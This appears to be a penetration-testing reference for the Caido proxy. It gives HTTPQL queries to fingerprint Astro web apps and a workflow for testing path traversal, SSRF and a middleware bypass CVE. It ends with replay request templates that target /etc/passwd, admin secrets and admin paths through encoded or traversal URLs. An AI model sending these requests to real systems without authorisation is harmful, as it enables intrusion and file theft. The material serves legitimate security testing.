# 05 - Caido Detection Patterns

## Fingerprinting Astro Applications

### Response Header Detection

```httpql
resp.raw.cont:"x-astro-"
```

### HTML Generator Meta Tag

```httpql
resp.body.cont:"<meta name=\"generator\" content=\"Astro"
```

### Client-Side Hydration Scripts

```httpql
resp.body.cont:"self.Astro||(self.Astro={})"
```

```httpql
resp.body.cont:"astro:idle" OR resp.body.cont:"astro:load" OR resp.body.cont:"astro:visible"
```

### Build Asset Paths

```httpql
resp.body.cont:"/_astro/" OR req.path.cont:"/_astro/"
```

### Server Islands (Astro 5+)

```httpql
req.path.cont:"/_server-islands/"
```

### Image Endpoint

```httpql
req.path.eq:"/_image"
```

## Identifying SSR Mode

### Dynamic Route Indicators

SSR apps return HTML for dynamic paths that SSG would 404 on:

```httpql
req.path.cont:"/users/" AND resp.code.eq:200
```

### Session Cookies

SSR mode with sessions:

```httpql
resp.raw.cont:"Set-Cookie" AND resp.raw.cont:"astro-session"
```

## Route Extraction

### Dynamic Parameter Routes

Look for patterns in HTML links that suggest dynamic routes:

```httpql
resp.body.cont:"/users/" AND resp.body.cont:"/shop/" AND resp.body.cont:"/api/"
```

### API Routes

```httpql
req.path.cont:"/api/" AND resp.raw.cont:"Content-Type: application/json"
```

### Catch-All Route Detection

If the same route prefix handles deeply nested paths:

```httpql
req.path.cont:"/files/" AND req.path.cont:"/" AND resp.code.eq:200
```

## Sink Detection in Responses

### `set:html` Usage (XSS Sink)

Not directly detectable in responses since `set:html` is compiled out. Look for evidence of unescaped HTML rendering:

```httpql
resp.body.cont:"<script" AND resp.body.cont:"set:html"
```

In source code review (if available):
```
set:html=
set:html={
```

### Server-Side Fetch Patterns

Look for responses that reflect backend data structures:

```httpql
resp.body.cont:"internal" OR resp.body.cont:"backend" OR resp.body.cont:"localhost"
```

### SSRF Indicators

Responses that change based on path manipulation:

```httpql
req.path.cont:"/api/proxy/" AND resp.code.ne:404
```

## Middleware Bypass Testing

### Encoded Letter Bypass (CVE-2025-64765)

```httpql
req.raw.cont:"%61" OR req.raw.cont:"%64" OR req.raw.cont:"%6d" OR req.raw.cont:"%69" OR req.raw.cont:"%6e"
```

### Testing Admin Access

```httpql
req.path.cont:"admin" AND resp.code.eq:200
```

After bypass attempt:

```httpql
req.raw.cont:"%61dmin" AND resp.code.ne:403
```

## CSPT/SSRF Payload Patterns

### Catch-All Traversal

```httpql
req.path.cont:"/files/" AND req.path.cont:".."
```

### API Proxy Abuse

```httpql
req.path.cont:"/api/proxy/" AND req.path.cont:".."
```

### Encoded Dot Traversal

```httpql
req.raw.cont:"%2E%2E" OR req.raw.cont:"%2e%2e"
```

### Double-Encoding Detection (should be blocked)

```httpql
req.raw.cont:"%25" AND resp.code.ne:400
```

## Workflow: Astro CSPT Assessment

### Phase 1: Fingerprint

```httpql
resp.body.cont:"Astro" OR resp.body.cont:"/_astro/" OR resp.body.cont:"astro:idle"
```

### Phase 2: Identify SSR

```httpql
resp.code.eq:200 AND req.path.cont:"/api/"
```

### Phase 3: Map Dynamic Routes

Test paths with varying depth:
```httpql
req.path.cont:"/files/" AND resp.code.eq:200
req.path.cont:"/api/proxy/" AND resp.code.eq:200
```

### Phase 4: Test Traversal

```httpql
req.path.cont:".." AND resp.code.ne:400 AND resp.code.ne:404
```

### Phase 5: Test Middleware Bypass

```httpql
req.raw.cont:"%61dmin" AND resp.code.ne:403
```

### Phase 6: Test SSRF

Look for internal service responses:
```httpql
resp.body.cont:"internal" AND req.path.cont:".."
```

## Replay Templates

### Catch-All Traversal Test

```
GET /files/../../etc/passwd HTTP/1.1
Host: target.com
```

### API Proxy SSRF

```
GET /api/proxy/../../internal-service/admin HTTP/1.1
Host: target.com
```

### Middleware Bypass

```
GET /%61dmin HTTP/1.1
Host: target.com
```

### Encoded Dots in Catch-All

```
GET /files/%2E%2E/%2E%2E/admin/secrets HTTP/1.1
Host: target.com
```

### Single Param with Encoded Content

```
GET /users/%00admin HTTP/1.1
Host: target.com
```

## Astro-Specific vs Generic Patterns

| Pattern | Astro-Specific? | Why |
|---|---|---|
| `%2F` traversal | Does NOT work | `decodeURI()` preserves `%2F` |
| Literal `/` in catch-all | Works | `(.*?)` regex matches `/` |
| `%2E%2E` encoded dots | Works | `decodeURI()` decodes `.` |
| `%61dmin` encoded letters | Works (middleware) | `decodeURI()` decodes letters |
| Double encoding `%25XX` | Blocked | `validateAndDecodePathname()` |
| `%5C` backslash traversal | OS-dependent | Both frameworks decode to `\` |
| Tab-encoded (Front pattern) | NOT applicable | Different framework |
